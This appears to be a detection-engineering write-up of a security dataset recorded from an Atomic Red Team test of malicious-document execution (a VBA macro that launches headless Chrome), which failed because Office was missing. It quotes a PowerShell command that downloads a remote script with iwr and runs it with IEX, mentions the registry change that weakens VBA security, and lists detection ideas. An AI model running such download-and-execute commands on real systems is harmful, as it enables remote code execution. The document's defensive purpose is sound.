# T1204.002-7: Malicious File — Headless Chrome code execution via VBA

## Technique Context

T1204.002 (User Execution: Malicious File) represents one of the most common initial access and execution vectors in modern threat landscapes. Attackers frequently use malicious documents containing macros, exploits, or embedded code to gain initial execution on target systems. This particular test simulates a VBA macro that attempts to execute Chrome in headless mode for code execution, representing a more sophisticated approach than traditional macro-based payloads.

The detection community focuses heavily on this technique because it bridges user interaction (opening a malicious file) with automated execution, making it both prevalent and challenging to detect. Key detection opportunities include macro execution telemetry, suspicious Office application behavior, child process spawning from Office applications, and network connections from unexpected processes.

## What This Dataset Contains

This dataset captures a PowerShell-based simulation of malicious document execution using the Atomic Red Team's `Invoke-MalDoc` framework. The key evidence includes:

**PowerShell Command Execution**: Security event 4688 shows PowerShell executing with command line `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) Invoke-Maldoc -macroFile \"C:\AtomicRedTeam\atomics\T1204.002\src\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"}`, demonstrating the full attack chain.

**Script Block Logging**: PowerShell event 4104 captures the complete `Invoke-MalDoc` function, showing VBA automation code designed to `$app = New-Object -ComObject "$officeProduct.Application"` and manipulate Office applications programmatically.

**COM Object Creation Failure**: PowerShell error event 4100 shows `Error Message = Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered`, indicating the technique failed because Microsoft Office is not installed on this system.

**DNS Resolution**: Sysmon event 22 captures DNS query for `raw.githubusercontent.com` with results `::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.111.133;::ffff:185.199.110.133`, showing the network component of the payload retrieval.

**Process Chain**: Sysmon events 1 and Security events 4688 show the execution chain: parent PowerShell → child PowerShell (with malicious command) → whoami.exe execution for discovery.

## What This Dataset Does Not Contain

**Actual Office Application Activity**: Since Microsoft Office is not installed on the test system, the technique fails at the COM object creation stage. This means there are no genuine Word.exe processes, VBA execution telemetry, or macro-related file operations.

**Successful Chrome Execution**: The intended headless Chrome spawning never occurs due to the Office dependency failure, so there are no chrome.exe processes or headless browser activities.

**Registry Modifications**: The `Invoke-MalDoc` function is designed to modify registry keys like `HKCU:\Software\Microsoft\Office\$officeVersion\$officeProduct\Security\AccessVBOM`, but these modifications don't occur due to the execution failure.

**Document Creation**: No actual malicious document files are created or opened since the Office automation fails immediately.

## Assessment

This dataset provides moderate value for detection engineering despite the execution failure. The comprehensive PowerShell telemetry demonstrates the attack preparation phase excellently, including script download, function definition, and parameter passing. The COM object creation failure actually makes this dataset valuable for understanding how these attacks fail in environments without Office, which is common in server environments.

The Security event command-line logging and PowerShell script block logging provide excellent coverage of the attack vector, while Sysmon captures the supporting process and network activity. However, the lack of actual Office application interaction limits its utility for building detections specific to malicious document execution.

## Detection Opportunities Present in This Data

1. **Suspicious PowerShell Download and Execution**: Detect PowerShell downloading scripts from GitHub and immediately executing them via `IEX (iwr "https://raw.githubusercontent.com/..." -UseBasicParsing)`

2. **Invoke-MalDoc Framework Detection**: Alert on PowerShell script blocks containing the `Invoke-MalDoc` function signature or calls to `$app = New-Object -ComObject` with Office application names

3. **COM Object Creation for Office Automation**: Monitor for PowerShell processes attempting to create COM objects for Word.Application or Excel.Application, especially when not associated with legitimate administrative scripts

4. **Registry VBA Access Modification Attempts**: Detect PowerShell attempting to modify `AccessVBOM` registry keys under Office security settings paths

5. **Suspicious Process Command Line Patterns**: Alert on PowerShell command lines containing combinations of network downloads (`iwr`), immediate execution (`IEX`), and Office-related parameters (`-officeProduct`, `-macroFile`)

6. **GitHub Raw Content Access**: Monitor for processes accessing `raw.githubusercontent.com` with immediate script execution patterns, especially from PowerShell or scripting engines

7. **Failed COM Object Creation Patterns**: Track PowerShell error events with CLSID registration failures as potential indicators of attack attempts against missing software dependencies
